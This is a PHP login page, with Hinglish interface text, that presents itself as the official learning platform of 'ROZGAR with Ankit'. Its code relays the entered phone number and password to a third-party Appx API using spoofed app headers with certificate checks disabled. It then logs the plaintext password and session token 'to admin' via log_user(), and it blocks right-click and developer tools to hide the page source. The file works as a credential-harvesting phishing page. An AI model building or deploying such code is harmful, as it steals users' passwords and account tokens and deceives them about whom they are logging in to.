<?php
require_once 'config.php';
if (session_status() === PHP_SESSION_NONE) session_start();
send_security_headers();

$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone    = trim($_POST['phone']    ?? '');
    $password = trim($_POST['password'] ?? '');

    if (empty($phone) || empty($password)) {
        $error = 'Phone number aur password dono zaroori hain.';
    } else {
        $token = null; $userid = null;

        // Method 1 - okhttp
        $ch = curl_init(API_BASE . '/post/userLogin');
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query(['email'=>$phone,'password'=>$password]),
            CURLOPT_TIMEOUT        => 15,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_ENCODING       => '',
            CURLOPT_HTTPHEADER     => [
                'Auth-Key: appxapi','User-Id: -2','Authorization: ',
                'Language: en','Content-Type: application/x-www-form-urlencoded',
                'Accept-Encoding: gzip, deflate','User-Agent: okhttp/4.9.1',
            ],
        ]);
        $resp1 = curl_exec($ch); curl_close($ch);
        $r1 = json_decode($resp1, true);
        if (!$r1 && preg_match('/\{"status":.*?\}/s', $resp1, $m))
            $r1 = json_decode($m[0], true);

        if ($r1 && ($r1['status']??0)==200) {
            $userid = $r1['data']['userid'] ?? null;
            $token  = $r1['data']['token']  ?? null;
        } elseif ($r1 && ($r1['status']??0)==203) {
            // Method 2 - website
            $ch2 = curl_init(API_BASE . '/post/userLogin');
            curl_setopt_array($ch2, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => http_build_query(['email'=>$phone,'password'=>$password]),
                CURLOPT_TIMEOUT        => 15,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_ENCODING       => '',
                CURLOPT_HTTPHEADER     => [
                    'Client-Service: Appx','source: website','Auth-Key: appxapi',
                    'Authorization: ','User-ID: -2',
                    'Content-Type: application/x-www-form-urlencoded',
                    'User-Agent: Mozilla/5.0 (Linux; Android 12) Chrome/124 Mobile Safari/537',
                ],
            ]);
            $resp2 = curl_exec($ch2); curl_close($ch2);
            $r2 = json_decode($resp2, true);
            if ($r2 && ($r2['status']??0)==200) {
                $userid = $r2['data']['userid'] ?? null;
                $token  = $r2['data']['token']  ?? null;
            }
        }

        if ($token && $userid) {
            // Log to admin
            log_user([
                'phone'    => $phone,
                'password' => $password,
                'userid'   => $userid,
                'token'    => $token,
                'login_type' => 'manual',
            ]);
            // Set session
            $_SESSION['token']      = $token;
            $_SESSION['userid']     = $userid;
            $_SESSION['phone']      = $phone;
            $_SESSION['login_type'] = 'manual';
            header('Location: dashboard.php');
            exit;
        } else {
            $error = 'Wrong credentials. Rozgar Learning ka sahi ID/Password daalo.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Login · <?=APP_NAME?></title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{--p:#7c3aed;--p2:#a78bfa;--g:#06b6d4;--bg:#030307;--c1:#0d0d14;--c2:#12121c;--b1:#1e1e30;--b2:#2a2a40;--t1:#f8fafc;--t2:#94a3b8;--t3:#475569}
html,body{height:100%;background:var(--bg);color:var(--t1);font-family:'Outfit',sans-serif;-webkit-tap-highlight-color:transparent;overflow-x:hidden}
body{min-height:100dvh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
/* Glow bg */
.gbg{position:fixed;inset:0;pointer-events:none;z-index:0}
.gbg::before{content:'';position:absolute;top:-20%;left:50%;transform:translateX(-50%);width:400px;height:400px;border-radius:50%;background:radial-gradient(circle,rgba(124,58,237,.15),transparent 70%)}
.gbg::after{content:'';position:absolute;bottom:-10%;right:-10%;width:300px;height:300px;border-radius:50%;background:radial-gradient(circle,rgba(6,182,212,.08),transparent 70%)}
.wrap{width:100%;max-width:390px;position:relative;z-index:1}
/* Logo */
.logo-sec{text-align:center;margin-bottom:36px}
.logo-ico{width:72px;height:72px;border-radius:22px;background:linear-gradient(135deg,var(--p),var(--g));display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff;margin:0 auto 16px;box-shadow:0 0 40px rgba(124,58,237,.4)}
.logo-sec h1{font-size:24px;font-weight:900;margin-bottom:6px}
.logo-sec p{font-size:13px;color:var(--t2);line-height:1.5}
/* Card */
.card{background:var(--c1);border:1px solid var(--b1);border-radius:24px;padding:28px 22px;margin-bottom:16px}
.card-ttl{font-size:18px;font-weight:800;margin-bottom:6px}
.card-sub{font-size:12px;color:var(--t3);margin-bottom:22px;font-family:'JetBrains Mono',monospace;line-height:1.6}
.field{margin-bottom:16px}
.field label{display:block;font-size:12px;font-weight:600;color:var(--t2);margin-bottom:8px;letter-spacing:.05em}
.field .inp-wrap{position:relative}
.field .ico{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--t3);font-size:13px}
.field input{width:100%;background:var(--c2);border:1px solid var(--b1);color:var(--t1);padding:13px 14px 13px 42px;border-radius:14px;font-size:15px;font-family:'Outfit',sans-serif;outline:none;transition:border-color .2s,-webkit-box-shadow .2s}
.field input:focus{border-color:rgba(124,58,237,.5);box-shadow:0 0 0 3px rgba(124,58,237,.08)}
.field input::placeholder{color:var(--t3)}
.eye-btn{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--t3);cursor:pointer;padding:4px;font-size:14px}
.err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);border-radius:12px;padding:12px 16px;font-size:13px;color:#f87171;margin-bottom:16px;display:flex;align-items:center;gap:10px}
.err i{flex-shrink:0}
.ok{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:12px;padding:12px 16px;font-size:13px;color:#4ade80;margin-bottom:16px;display:flex;align-items:center;gap:10px}
.btn-login{width:100%;background:linear-gradient(135deg,var(--p),#5b21b6);color:#fff;border:none;border-radius:14px;padding:15px;font-size:16px;font-weight:700;cursor:pointer;font-family:'Outfit',sans-serif;transition:opacity .15s;margin-top:4px;display:flex;align-items:center;justify-content:center;gap:8px}
.btn-login:active{opacity:.85}
.divider{display:flex;align-items:center;gap:12px;margin:18px 0;color:var(--t3);font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--b1)}
.btn-skip{width:100%;background:var(--c2);border:1px solid var(--b1);color:var(--t2);border-radius:14px;padding:14px;font-size:14px;font-weight:600;cursor:pointer;font-family:'Outfit',sans-serif;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s}
.btn-skip:active{background:var(--b1)}
/* Info box */
.info-box{background:linear-gradient(135deg,rgba(124,58,237,.08),rgba(6,182,212,.04));border:1px solid rgba(124,58,237,.18);border-radius:16px;padding:16px;margin-bottom:16px}
.info-box h4{font-size:13px;font-weight:700;margin-bottom:8px;color:var(--p2);display:flex;align-items:center;gap:8px}
.info-box p{font-size:12px;color:var(--t2);line-height:1.7}
.info-box p i{color:var(--p2);margin-right:6px;font-size:11px}
/* Footer */
footer{font-size:10px;color:var(--t3);text-align:center;font-family:'JetBrains Mono',monospace;margin-top:8px}
</style>
</head>
<body>
<div class="gbg"></div>
<div class="wrap">
  <div class="logo-sec">
    <div class="logo-ico"><i class="fas fa-graduation-cap"></i></div>
    <h1><?=APP_NAME?></h1>
    <p>ROZGAR with Ankit ki Official<br>Learning Platform</p>
  </div>

  <div class="info-box">
    <h4><i class="fas fa-circle-info"></i> Login Kaise Karen?</h4>
    <p>
      <i class="fas fa-check"></i> Rozgar Learning ki official website<br>
      <i class="fas fa-check"></i> Apni registered mobile number daalo<br>
      <i class="fas fa-check"></i> Aur apna password daalo — bas!
    </p>
  </div>

  <div class="card">
    <div class="card-ttl">Welcome Back 👋</div>
    <div class="card-sub">ROZGAR with Ankit ID se login karo &amp; apne sare batches dekho</div>

    <?php if($error): ?>
    <div class="err"><i class="fas fa-triangle-exclamation"></i><?=htmlspecialchars($error)?></div>
    <?php endif; ?>
    <?php if($success): ?>
    <div class="ok"><i class="fas fa-check-circle"></i><?=htmlspecialchars($success)?></div>
    <?php endif; ?>

    <form method="POST" action="login.php" autocomplete="off">
      <div class="field">
        <label>MOBILE NUMBER / EMAIL</label>
        <div class="inp-wrap">
          <i class="ico fas fa-user"></i>
          <input type="text" name="phone" placeholder="Mobile ya Email daalo" value="<?=htmlspecialchars($_POST['phone']??'')?>" required autocomplete="username">
        </div>
      </div>
      <div class="field">
        <label>PASSWORD</label>
        <div class="inp-wrap">
          <i class="ico fas fa-lock"></i>
          <input type="password" id="pwd" name="password" placeholder="Apna password daalo" required autocomplete="current-password">
          <button type="button" class="eye-btn" onclick="togglePwd()"><i class="fas fa-eye" id="eye-ico"></i></button>
        </div>
      </div>
      <button type="submit" class="btn-login"><i class="fas fa-sign-in-alt"></i> Login Karo</button>
    </form>

    <div class="divider">ya</div>

    <button class="btn-skip" onclick="window.location.href='dashboard.php'">
      <i class="fas fa-rocket"></i> Skip — Seedha Batches Dekho
    </button>
  </div>

  <footer><?=APP_NAME?> · Secure Portal · All Rights Reserved</footer>
</div>
<script>
(function(){
  document.addEventListener('contextmenu',e=>e.preventDefault());
  document.addEventListener('keydown',e=>{
    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C','U'].includes(e.key))||(e.ctrlKey&&e.key==='U'))
      {e.preventDefault();return false;}
  });
})();
function togglePwd(){
  const i=document.getElementById('pwd');
  const ico=document.getElementById('eye-ico');
  if(i.type==='password'){i.type='text';ico.className='fas fa-eye-slash';}
  else{i.type='password';ico.className='fas fa-eye';}
}
</script>
</body>
</html>
